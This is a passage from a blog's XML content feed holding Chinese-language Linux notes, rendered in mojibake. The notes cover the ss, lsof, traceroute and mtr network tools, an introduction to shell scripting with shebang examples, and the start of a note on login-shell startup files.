å‘½ä»¤</h2><p>netstat ä» proc æ–‡ä»¶ç³»ç»Ÿè·å–æ‰€éœ€è¦çš„ä¿¡æ¯ï¼Œè€Œ ss åˆ©ç”¨ netlinkæœºåˆ¶ï¼Œä¸å†…æ ¸é€šä¿¡ï¼Œé€šè¿‡ TCP åè®®æ ˆä¸­ tcp_diagæ¨¡å—è·å–ç¬¬ä¸€æ‰‹çš„å†…æ ¸ä¿¡æ¯ã€‚</p><p>ss æ—¨åœ¨æ›¿ä»£ netstatï¼Œ ss æ›´ä¸ºå¼ºå¤§å’Œé«˜æ•ˆï¼Œè€Œä¸”ä» netstat è¿ç§»è‡³ ssï¼Œå‡ ä¹ä¸éœ€è¦è´¹åŠ›ã€‚</p><p>ss çš„ <code>-t, -u, -a, -n, -l, -p, -e</code> é€‰é¡¹å‡ä¸<code>netstat</code> ä¸€è‡´ï¼ˆæ³¨ï¼š<code>-r</code> åœ¨ ssä¸­æ˜¯å°½åŠ›è¿›è¡ŒåŸŸåè§£æçš„æ„æ€ï¼‰</p><h2 id="lsof">lsof</h2><p>Linuxä¸€åˆ‡çš†æ–‡ä»¶ï¼Œé€šè¿‡æ–‡ä»¶ä¸ä»…ä»…å¯ä»¥è®¿é—®å¸¸è§„æ•°æ®ï¼Œè¿˜å¯ä»¥è®¿é—®ç½‘ç»œè¿æ¥å’Œç¡¬ä»¶ã€‚ä¾‹å¦‚ï¼šä¼ è¾“æ§åˆ¶åè®®(TCP) å’Œç”¨æˆ·æ•°æ®æŠ¥åè®® (UDP)å¥—æ¥å­—ç­‰ï¼Œç³»ç»Ÿåœ¨åå°éƒ½ä¸ºè¯¥åº”ç”¨ç¨‹åºåˆ†é…äº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæ— è®ºè¿™ä¸ªæ–‡ä»¶çš„æœ¬è´¨å¦‚ä½•ï¼Œè¯¥æ–‡ä»¶æè¿°ç¬¦ä¸ºåº”ç”¨ç¨‹åºä¸åŸºç¡€æ“ä½œç³»ç»Ÿä¹‹é—´çš„äº¤äº’æä¾›äº†é€šç”¨æ¥å£ã€‚å› ä¸ºåº”ç”¨ç¨‹åºæ‰“å¼€æ–‡ä»¶çš„æè¿°ç¬¦åˆ—è¡¨æä¾›äº†å¤§é‡å…³äºè¿™ä¸ªåº”ç”¨ç¨‹åºæœ¬èº«çš„ä¿¡æ¯ï¼Œå› æ­¤é€šè¿‡lsof å·¥å…·èƒ½å¤ŸæŸ¥çœ‹è¿™ä¸ªåˆ—è¡¨å¯¹ç³»ç»Ÿç›‘æµ‹ä»¥åŠæ’é”™å°†æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚</p><p>lsofï¼ˆlist open filesï¼‰æ˜¯ä¸€ä¸ªåˆ—å‡ºå½“å‰ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶çš„å·¥å…·</p><p>å¸¸ç”¨é€‰é¡¹ï¼š<code>-i</code></p><ol type="1"><li><p>åˆ—å‡ºæ‰€æœ‰çš„ç½‘ç»œè¿æ¥ <code>lsof -i</code></p></li><li><p>åˆ—å‡ºæ‰€æœ‰ tcp ç½‘ç»œè¿æ¥ä¿¡æ¯ï¼ˆudp åŒæ ·ä½¿ç”¨ï¼Œåªéœ€å°† tcp æ”¹ä¸ºudpï¼‰</p><p><code>lsof -i tcp</code></p></li><li><p>åˆ—å‡ºè°åœ¨ä½¿ç”¨æŸä¸ªç«¯å£</p><p><code>lsof -i :3306</code></p></li><li><p>åˆ—å‡ºè°åœ¨ä½¿ç”¨æŸä¸ªç‰¹å®šçš„ tcp ç«¯å£ï¼ˆudp åŒæ ·ä½¿ç”¨ï¼Œåªéœ€å°† tcp æ”¹ä¸ºudpï¼‰</p><p><code>lsof -i tcp:10808</code></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://linuxize.com/post/check-listening-ports-linux/">Howto Check for Listening Ports in Linux (Ports in use)</a></li><li><ahref="https://www.cnblogs.com/pc-boke/articles/10012112.html">netstat å’Œlsof çš„åŒºåˆ«</a></li><li><a href="https://linux.cn/article-2434-1.html">netstat çš„ 10ä¸ªåŸºæœ¬ç”¨æ³•</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> netstat </tag>
            
            <tag> ss </tag>
            
            <tag> lsof </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>traceroute &amp; mtr</title>
      <link href="/blog/2020/07/13/linux/tools/traceroute/"/>
      <url>/blog/2020/07/13/linux/tools/traceroute/</url>
      
        <content type="html"><![CDATA[<h2 id="traceroute">traceroute</h2><blockquote><p>'traceroute' prints a trace of the route IP packets are travelling toa remote host.</p></blockquote><p>ä¸‹é¢æ˜¯æˆ‘ä» <code>man traceroute</code>æ‘˜å½•å‡ºæ¥çš„æ¯”è¾ƒæœ‰ä»·å€¼çš„å†…å®¹ï¼š</p><p>This program attempts to trace the route of an IP packet. it wouldfollow to some internet host by launching probe packets with a small ttl(time to live), then listening for an ICMP "time exceeded" reply from agateway.</p><p>We start our probes with a ttl of one and increase by one until weget an ICMP "port unreachable" (or TCP reset), which means we got to the"host", or hit a max (which defaults to 30 hops). <strong>Three probes(by default)</strong> are sent at each ttl setting and a line is printedshowing the ttl, address of the gateway and round trip time of eachprobe.</p><p>If the probe answers come from different gateways, the address ofeach responding system will be printed. If there is no response within acertain timeout, an "*" (asterisk) is printed for that probe.</p><p>We don't want the destination host to process the UDP probe packets,so the destination port is set to an unlikely value (you can change itwith the -p flag). There is no such a problem for ICMP or TCPtracerouting (for TCP we use half-open technique, which prevents ourprobes to be seen by applicaâ€ tions on the destination host).</p><p>In the modern network environment the traditional traceroute methodscan not be always applicable, because of widespread use of firewalls.Such firewalls filter the "unlikely" UDP ports, or even ICMP echoes. Tosolve this, some additional tracerouting methods are implemented(including tcp, udp), Such methods try to use particular protocol andsource/destination port, in order to bypass firewalls (to be seen byfirewalls just as a start of allowed type of a network session).</p><h3 id="ä½¿ç”¨">ä½¿ç”¨</h3><p><code>traceroute [-q nqueries][-M method] host</code></p><p><code>-q nqueries</code>: æŒ‡å®š n æ¬¡æŸ¥è¯¢ï¼Œé»˜è®¤æ˜¯ 3 æ¬¡ã€‚<code>-M method</code>ï¼š å¯ä»¥æœ‰ <code>-I</code>: Use ICMP ECHO forprobes, <code>-T</code>:Use TCP SYN for probes</p><h2 id="mtr">mtr</h2><p><code>mtr</code> æ˜¯ my traceroute çš„ç¼©å†™ã€‚</p><ul><li><blockquote><p>mtr combines the functionality of the traceroute and ping programs ina single network diagnostic tool.</p></blockquote></li></ul><h3 id="ä½¿ç”¨-1">ä½¿ç”¨</h3><p><code>mtr www.baidu.com</code></p><p>ç»“æœçš„è¡¨å¤´ï¼š<code>Host Loss% Snt Last Avg Best Wrst StDev</code></p><p>è¡¨å¤´å‚æ•°è§£é‡Šï¼š</p><ul><li>ä¸»æœº IP åœ°å€</li><li>ä¸¢åŒ…ç‡ï¼šLoss</li><li>å·²å‘é€çš„åŒ…æ•°ï¼šSnt</li><li>æœ€åä¸€ä¸ªåŒ…çš„å»¶æ—¶ï¼šLast</li><li>å¹³å‡å»¶æ—¶ï¼šAvg</li><li>æœ€ä½å»¶æ—¶ï¼šBest</li><li>æœ€å·®å»¶æ—¶ï¼šWrst</li><li>æ–¹å·®ï¼ˆç¨³å®šæ€§ï¼‰ï¼šStDev</li></ul><p><code>-r, --report</code> This option puts mtr into report mode. Whenin this mode, mtr will run for the number of cycles specified by the -coption, and then print statistics and exit.</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> traceroute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell å…¥é—¨</title>
      <link href="/blog/2020/07/13/programming/shell/0.intro/"/>
      <url>/blog/2020/07/13/programming/shell/0.intro/</url>
      
        <content type="html"><![CDATA[<h1 id="shell">Shell</h1><h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ã€‚Shellæ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€ã€‚</p><p>Shellæ˜¯æŒ‡ä¸€ç§åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªç•Œé¢è®¿é—®æ“ä½œç³»ç»Ÿå†…æ ¸çš„æœåŠ¡ã€‚</p><p>Ken Thompson çš„ sh æ˜¯ç¬¬ä¸€ç§ Unix Shellï¼ŒWindows Exploreræ˜¯ä¸€ä¸ªå…¸å‹çš„å›¾å½¢ç•Œé¢ Shellã€‚</p><p>å•ç‹¬åœ°å­¦ä¹  Shell æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼ŒShelléœ€è¦ä¾èµ–å…¶ä»–ç¨‹åºæ‰èƒ½å®Œæˆå¤§éƒ¨åˆ†çš„å·¥ä½œï¼Œè¿™æˆ–è®¸æ˜¯å®ƒçš„ç¼ºé™·ï¼Œä½†å®ƒä¸å®¹ç½®ç–‘çš„é•¿å¤„æ˜¯ï¼šç®€æ´çš„è„šæœ¬è¯­è¨€æ ‡è®°æ–¹å¼ï¼Œè€Œä¸”æ¯”C è¯­è¨€ç¼–å†™çš„ç¨‹åºæ‰§è¡Œæ›´å¿«ã€æ›´æœ‰æ•ˆç‡ã€‚</p><p>æ¢å¥è¯è¯´ï¼ŒShellåŸºæœ¬æ²¡æœ‰è¯­æ³•éš¾åº¦ï¼Œä½†æ˜¯å®ƒæ›´å¤šç”¨çš„æ˜¯å¯¹åº”å·¥å…·çš„ç®¡ç†å‘½ä»¤ã€‚æ¯”å¦‚ï¼šå†™ä¸ª LAMPå®‰è£…è„šæœ¬ï¼Œä½ é‡ç‚¹éœ€è¦ç†Ÿæ‚‰æ˜¯ LAMP çš„å·¥å…·ç®¡ç†å‘½ä»¤ï¼Œè€Œä¸æ˜¯ç®€å•åœ° shellè¯­è¨€ã€‚</p><p>ç›®å‰ä¸»è¦å­¦ä¹  shellçš„åŸºç¡€å’Œç®€å•åº”ç”¨ï¼Œåé¢å­¦ä¹ äº†è¶³å¤Ÿçš„ç®¡ç†å·¥å…·ï¼Œå†æ·±å…¥åº”ç”¨ã€‚</p><p>å›¾å½¢ç•Œé¢å’Œå‘½ä»¤è¡Œè¦è¾¾åˆ°çš„ç›®çš„æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯è®©ç”¨æˆ·æ§åˆ¶è®¡ç®—æœºã€‚</p><p>Shell é™¤äº†èƒ½è§£é‡Šç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼Œå°†å®ƒä¼ é€’ç»™å†…æ ¸ï¼Œè¿˜å¯ä»¥ï¼š 1.è°ƒç”¨å…¶ä»–ç¨‹åºï¼Œç»™å…¶ä»–ç¨‹åºä¼ é€’æ•°æ®æˆ–å‚æ•°ï¼Œå¹¶è·å–ç¨‹åºçš„å¤„ç†ç»“æœï¼› 2.åœ¨å¤šä¸ªç¨‹åºä¹‹é—´ä¼ é€’æ•°æ®ï¼ŒæŠŠä¸€ä¸ªç¨‹åºçš„è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªç¨‹åºçš„è¾“å…¥ï¼› 3. Shellæœ¬èº«ä¹Ÿå¯ä»¥è¢«å…¶ä»–ç¨‹åºè°ƒç”¨ã€‚</p><p>ç”±æ­¤å¯è§ï¼ŒShell æ˜¯å°†å†…æ ¸ã€ç¨‹åºå’Œç”¨æˆ·è¿æ¥äº†èµ·æ¥ã€‚</p><h3 id="shell-èƒ½åšä»€ä¹ˆ">Shell èƒ½åšä»€ä¹ˆ</h3><ol type="1"><li><p>è‡ªåŠ¨åŒ–ç³»ç»Ÿåˆå§‹åŒ–(Updateï¼Œ è½¯ä»¶æºé…ç½®ã€æ›´æ–°ã€æ—¶åŒºè®¾ç½®ã€å®‰å…¨ç­–ç•¥)å½“æˆ‘ä»¬è£…å®Œç³»ç»Ÿä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç³»ç»Ÿçš„æ—¶åŒºã€è½¯ä»¶åŒ…çš„æºã€è½¯ä»¶æ›´æ–°ã€å®‰å…¨è®¾ç½®ç­‰è¿›è¡Œä¸€äº›åˆå§‹åŒ–</p><p>æˆ‘æ€ä¹ˆæ²¡æƒ³åˆ°å‘¢ emmï¼Œæ—©çŸ¥é“æ—©ç‚¹å­¦ shelläº†ï¼Œè‹¦äº†æˆ‘é‡è£…äº†é‚£ä¹ˆå¤šæ¬¡ç³»ç»Ÿã€‚</p><ul class="task-list"><li><label><input type="checkbox" />å†™ä¸€ä¸ª manjaro è£…æœºåè‡ªåŠ¨åŒ–é…ç½®è„šæœ¬é¡ºä¾¿å†™ä¸Šå†™ä¸€ä¸ª manjaro å¿…å¤‡è½¯ä»¶å®‰è£…è„šæœ¬</label></li></ul></li><li><p>è‡ªåŠ¨åŒ–æ‰¹é‡è½¯ä»¶éƒ¨ç½²ç¨‹åºï¼ˆLAMP/LNMP/Tomcat/LVS/Nginxï¼‰</p></li><li><p>è‡ªåŠ¨åŒ–ç®¡ç†ç¨‹åºï¼ˆä¾‹å¦‚ï¼šKVM-managerç®¡ç†ã€é›†ç¾¤ç®¡ç†æ‰©å®¹ã€MySQLï¼ŒDELLR720 æ‰¹é‡ç®¡ç† RAIDï¼‰</p></li><li><p>æ—¥å¿—åˆ†æå¤„ç†ç¨‹åºï¼ˆç½‘ç«™ç»Ÿè®¡æ•°æ® PVã€UV å¤„ç†è¿‡æ»¤,å¦‚ï¼štop 100ç­‰ï¼Œå¸¸ç”¨ grep/awkï¼‰</p></li><li><p>è‡ªåŠ¨åŒ–å¤‡ä»½æ¢å¤ç¨‹åºï¼ˆMySQL å®Œå…¨å¤‡ä»½/å¢é‡å¤‡ä»½ + Crondï¼‰</p><ul class="task-list"><li><label><input type="checkbox" />è‡ªåŠ¨åŒ–å®šæœŸæ‰§è¡Œ Crondå­¦ä¹ </label></li></ul></li><li><p>è‡ªåŠ¨åŒ–ç®¡ç†ç¨‹åº(æ‰¹é‡è¿œç¨‹ä¿®æ”¹å¯†ç ã€è½¯ä»¶å‡çº§ã€é…ç½®æ›´æ–°)</p></li><li><p>è‡ªåŠ¨åŒ–ä¿¡æ¯é‡‡é›†åŠç›‘æ§ç¨‹åºï¼ˆæ”¶é›†ç³»ç»Ÿ/åº”ç”¨ç¨‹åºçŠ¶æ€ã€CPUã€Memã€Diskã€Netã€TCPStatusã€Apacheã€MySQLï¼‰</p></li><li><p>é…åˆ Zabbixä¿¡æ¯é‡‡é›†ï¼ˆæ”¶é›†ç³»ç»Ÿ/åº”ç”¨çŠ¶æ€ä¿¡æ¯ï¼ŒCPUã€Memã€Diskã€Netã€TCPStatusã€Apacheã€MySQLï¼‰</p></li><li><p>è‡ªåŠ¨åŒ–æ‰©å®¹ï¼ˆæ ¹æ®å³°å€¼è®¿é—®åŠ¨æ€è°ƒæ•´äº‘ä¸»æœºä¸ªæ•° --&gt; ä¸šåŠ¡ä¸Šçº¿ï¼‰Zabbix ç›‘æ§ CPU 80% -&gt; é¢„å¤„ç†ï¼š é€šè¿‡äºšé©¬é€Šã€é˜¿é‡Œäº‘ç­‰æä¾›çš„ Python APIè°ƒç”¨å¢åŠ ï¼ˆåˆ é™¤ï¼‰ AWS/EC2 ç­‰äº‘ä¸»æœº -&gt; ShellScript(å¯¹æ–°å¢çš„äº‘ä¸»æœºè¿›è¡Œä¸šåŠ¡ä¸Šçº¿)</p></li><li><p>ä¿„ç½—æ–¯æ–¹å—ã€æ‰“å°ä¸‰è§’å½¢ã€æ‰“å°åœ£è¯æ ‘ã€æ‰“å°äº”è§’æ˜Ÿã€è¿è¡Œå°ç«è½¦ã€å¦å…‹ã€æ’åºç®—æ³•</p></li><li><p>Shell ç†è®ºä¸Šå¯ä»¥åšä»»ä½•äº‹æƒ…ï¼ˆä¸€åˆ‡å–å†³äºä¸šåŠ¡éœ€æ±‚ï¼‰å½“ç„¶ï¼Œå®é™…åº”ç”¨ä¸­ï¼Œå¦‚æœä¸€ä¸ªåŠŸèƒ½å¤ªè¿‡äºå¤æ‚ï¼Œä¹Ÿä¸å»ºè®®ä½¿ç”¨ shellï¼Œ å¯ä»¥ä½¿ç”¨Pythonï¼ŒGo ç­‰</p></li></ol><h2 id="è¯­æ³•è§„èŒƒ">è¯­æ³•è§„èŒƒ</h2><ol type="1"><li><p>shell è„šæœ¬çš„åç¼€ä¸€èˆ¬ä¸º <code>.sh</code></p></li><li><p>å‘½ä»¤æ­£å¸¸æ‰§è¡Œè¿”å›å€¼ä¸º 0ï¼Œè¿”å›å€¼ä¸º <code>?</code> å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>$?</code> æ¥è·å–å®ƒçš„å€¼</p></li><li><p>åˆ†å·<code>;</code> ä½œä¸ºä¸åŒå‘½ä»¤çš„åˆ†éš”</p></li><li><p><code>&amp;&amp;</code> å’Œ <code>||</code>çš„çŸ­è·¯ä½œç”¨ï¼Œå¯ä»¥è¿›è¡Œé€»è¾‘åˆ¤æ–­ï¼Œè¾¾åˆ° if åˆ¤æ–­çœŸå‡çš„ä½œç”¨ï¼Œæ¯”å¦‚ï¼š<code>ping -c 1 www.baidu.com &amp;&gt;/dev/null &amp;&amp; echo "www.baidu.com is up" || echo "www.baidu.com is down"</code></p></li></ol><h2 id="python-shell-æ‰§è¡Œæ–¹å¼å¯¹æ¯”">Python Shell æ‰§è¡Œæ–¹å¼å¯¹æ¯”</h2><h3 id="ç¨‹åº">ç¨‹åº</h3><p>è‘—åçš„ç‘å£«è®¡ç®—æœºç§‘å­¦å®¶ã€PASCAL è¯­è¨€å‘æ˜è€… NÂ·æ²ƒæ€ï¼ˆNiklausWirthï¼‰æ•™æˆæå‡ºç¨‹åºå®šä¹‰çš„è‘—åå…¬å¼ï¼š<strong>ç¨‹åº=ç®—æ³•+æ•°æ®ç»“æ„</strong>ä»¥ä¸Šå…¬å¼è¯´æ˜äº†å¦‚ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š ï¼ˆ1ï¼‰ç®—æ³•å†³å®šå¦‚ä½•æ„é€ å’Œç»„ç»‡æ•°æ®ï¼ˆç®—æ³• â†’æ•°æ®ç»“æ„ï¼‰ã€‚ ï¼ˆ2ï¼‰ç®—æ³•çš„é€‰æ‹©ä¾èµ–äºä½œä¸ºåŸºç¡€çš„æ•°æ®ç»“æ„ï¼ˆæ•°æ®ç»“æ„ â†’ç®—æ³•ï¼‰ã€‚</p><p>ç®—æ³•æ˜¯æ•°æ®æ“ä½œï¼Œæ•°æ®ç»“æ„æ˜¯æ•°æ®çš„æè¿°</p><h3 id="ç®€å•å¯¹æ¯”">ç®€å•å¯¹æ¯”</h3><ol type="1"><li><p>Shell è§£é‡Šæ€§è„šæœ¬ï¼Œå¯ä»¥ç›´æ¥åœ¨ shell ä¸­ä»¥äº¤äº’æ¨¡å¼è¿è¡Œ å½“ç„¶ï¼Œshellæœ‰å¤šç§ï¼ˆè€Œä¸”éƒ½æœ‰äº›å·®å¼‚ï¼‰ï¼Œä½†ä¸€èˆ¬å°±æŒ‡ <code>bash</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/shells</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Pathnames of valid login shells.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See shells(5) <span class="keyword">for</span> details.</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br><span class="line">/usr/bin/git-shell</span><br><span class="line"></span><br></pre></td></tr></table></figure></p></li><li><p>Python</p><ol type="1"><li>è§£é‡Š Pythonæ˜¯ä¸€ä¸ªé«˜å±‚æ¬¡çš„ç»“åˆäº†è§£é‡Šæ€§ã€ç¼–è¯‘æ€§ã€äº’åŠ¨æ€§å’Œé¢å‘å¯¹è±¡çš„è„šæœ¬è¯­è¨€ã€‚</li><li>ç¼–è¯‘ Python æºç  --&gt; Python çš„ byte codeï¼ˆ.pyc æ ¼å¼ï¼‰ --&gt;Python Virtual Machine æ‰§è¡Œ å’Œ Java æˆ– .NET ç›¸æ¯”ï¼ŒPython çš„ VirtualMachine è·ç¦»çœŸå®æœºå™¨çš„è·ç¦»æ›´è¿œã€‚æˆ–è€…å¯ä»¥è¯´ Python çš„ Virtual Machineæ˜¯ä¸€ç§æŠ½è±¡å±‚æ¬¡æ›´é«˜çš„ Virtual Machineã€‚åŸºäº C çš„ Pythonç¼–è¯‘å‡ºçš„å­—èŠ‚ç æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯.pyc æ ¼å¼</li></ol></li><li><p>ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼šåœ¨ Javaå†™å¥½ç½‘ç«™ä¹‹åï¼Œæ¯ä¸ªåŠŸèƒ½ç‚¹ç¬¬ä¸€æ¬¡ç‚¹å‡»éƒ½æ¯”è¾ƒæ…¢ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡ç‚¹å‡»çš„æ—¶å€™éœ€è¦å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œä»¥åå°±å¿«äº†</p></li></ol><h2 id="shebang">shebang</h2><ol type="1"><li>é€šè¿‡ <code>$!</code> å¼€å§‹ä¸€ä¸ªè„šæœ¬ï¼Œ It is called a shebang or a"bang" line. <code>#!</code>åé¢è·Ÿç€è§£é‡Šå™¨çš„ç»å¯¹è·¯å¾„ï¼Œä¾‹å¦‚ï¼š<code>#!/usr/bin/bash</code></li><li>shebangåªèƒ½ç¬¬ä¸€è¡Œï¼Œä¹Ÿåªæœ‰æ”¾åœ¨ç¬¬ä¸€ä¸ªè¡Œæœ‰æ•ˆ,æ”¾åœ¨éç¬¬ä¸€è¡Œï¼Œé‚£å°±åªæ˜¯æ³¨é‡Šäº†ã€‚</li><li>Linux ä¸Šæ‰€æœ‰çš„è„šæœ¬æ‰§è¡Œéƒ½ä¼šä½¿ç”¨ç¬¬ä¸€è¡Œçš„ shebang æŒ‡å®šçš„è§£é‡Šå™¨ã€‚</li><li>è¿™ç¡®ä¿å³ä½¿å³ä½¿è„šæœ¬åœ¨å…¶ä»– shell åœ¨ä¸­æ‰§è¡Œæ—¶å€™ï¼Œä¹Ÿä¼šä½¿ç”¨ shebangæŒ‡å®šçš„è§£é‡Šå™¨ å¸¸è§çš„ shebangï¼š <code>#!/bin/bash</code>ã€<code>#!/usr/bin/perl</code>ã€ <code>#!/usr/bin/python</code>ã€<code>#!/usr/bin/python3</code>ã€ <code>#!/usr/bin/env bas</code></li><li>æ˜¾å¼æŒ‡å®šè§£é‡Šå™¨æ—¶ï¼Œåˆ™ä½¿ç”¨æ˜¾å¼çš„ï¼Œä¸æ˜¾ç¤ºæŒ‡å®šï¼Œé»˜è®¤ä½¿ç”¨ shebangæŒ‡å®šçš„ã€‚ éšå¼æ‰§è¡Œ shell è„šæœ¬ï¼Œä¸å†™ shebangï¼Œå½±å“ä¸å¤ªå¤§ï¼Œè€Œ pythonä¹‹ç±»è„šæœ¬çš„ï¼Œåœ¨ shell ä¸­éšå¼æ‰§è¡Œï¼Œï¼Œå¦‚æœæ²¡æœ‰ shebang çš„è¯ï¼Œåˆ™ä¼šä½¿ç”¨bash/shell ä½œä¸ºè§£é‡Šå™¨ã€‚ ä¸åŒç±»å‹è„šæœ¬ï¼Œåœ¨ shebangä¸­æŒ‡å®šå¯¹åº”çš„è§£é‡Šå™¨ã€‚</li></ol><p>æ¨èå†™æ³•ï¼š</p><blockquote><p>You should use <code>#!/usr/bin/env bash</code> forÂ <ahref="https://en.wikipedia.org/w/index.php?title=Shebang_(Unix)&amp;oldid=878552871#Portability">portability</a>:different *nixes putÂ <code>bash</code>Â in different places, andusingÂ <code>/usr/bin/env</code>Â is a workaround to run thefirstÂ <code>bash</code>Â found on theÂ <code>PATH</code>. And <ahref="https://mywiki.wooledge.org/BashGuide/CommandsAndArguments#Scripts"><code>sh</code>Â isnotÂ <code>bash</code></a>.</p></blockquote><p>é€šè¿‡ <code>which</code> å¯ä»¥æŸ¥çœ‹è§£é‡Šå™¨çš„è·¯å¾„ï¼Œæ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°<code>sh</code> å…¶å®æ˜¯æŒ‡å‘ <code>bash</code> çš„ä¸€ä¸ªè½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:37]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> python</span></span><br><span class="line">/usr/bin/python</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:44]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> sh</span></span><br><span class="line">/usr/bin/sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/testsh [13:58:49]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> bash</span></span><br><span class="line">/usr/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/bash</span></span><br><span class="line">-rwxr-xr-x 1 root root 907K  5æœˆ 27 03:32 /usr/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [13:03:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll /usr/bin/sh</span></span><br><span class="line">lrwxrwxrwx 1 root root 4  5æœˆ 27 03:32 /usr/bin/sh -&gt; bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ‰©å±•é˜…è¯»">æ‰©å±•é˜…è¯»</h2><p><ahref="https://www.zhihu.com/question/20448467">å¦‚ä½•æ¸…æ¥šæ˜“æ‡‚çš„è§£é‡Šâ€œUV å’ŒPVï¼‚çš„å®šä¹‰ï¼Ÿ</a></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.bilibili.com/video/BV19t411s7Jx">Linux Shellè„šæœ¬è‡ªåŠ¨åŒ–ç¼–ç¨‹å®æˆ˜ï¼ˆå®Œæ•´ç‰ˆï¼‰</a></p><p><ahref="https://stackoverflow.com/questions/10376206/what-is-the-preferred-bash-shebang">Whatis the preferred Bash shebang?</a></p><p><a href="https://bash.cyberciti.biz/guide/Shebang">Shebang</a></p><p><ahref="https://baike.baidu.com/item/Python/407313?fr=aladdin#7">Python</a></p>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shell ä¸€äº›ç‰¹æ€§</title>
      <link href="/blog/2020/07/13/programming/shell/1.shell_feature/"/>
      <url>/blog/2020/07/13/programming/shell/1.shell_feature/</url>
      
        <content type="html"><![CDATA[<h2 id="login-nologin-shell">login &amp; nologin shell</h2><h3 id="ç³»ç»Ÿçº§">ç³»ç»Ÿçº§</h3><p>è¿™ä¸¤ä¸ª <code>/etc/profile</code> ã€ <code>/etc/.bashrc</code> æ˜¯è¿›å…¥shell æ—¶ï¼Œæ‰§è¡Œçš„</p><h3 id="ç”¨æˆ·çº§">ç”¨æˆ·çº§</h3><p>è¿™ä¸¤ä¸ªæ˜¯ç™»å½• shell æ—¶æ‰§è¡Œçš„ï¼š</p><p><code>~/.bash_profile</code> <code>~/.bashrc</code></p><p>è¿™ä¸¤ä¸ªæ˜¯ç¦»å¼€ shell æ—¶æ‰§è¡Œï¼š</p><p><code>~/.bash_logout</code> <code>~/.bash_history</code> ï¼Œ å…¶ä¸­<code>history</code> å‘½ä»¤æ˜¯å®æ—¶æ›´æ–°çš„ï¼Œæœ¬æ¬¡ shellçš„å‘½ä»¤å†å²å­˜åœ¨ç¼“å­˜é‡Œé¢ï¼Œåœ¨é€€å‡º shell æ—¶æ‰ä¼šå†™å…¥åˆ°<code>~/.bash_history</code> 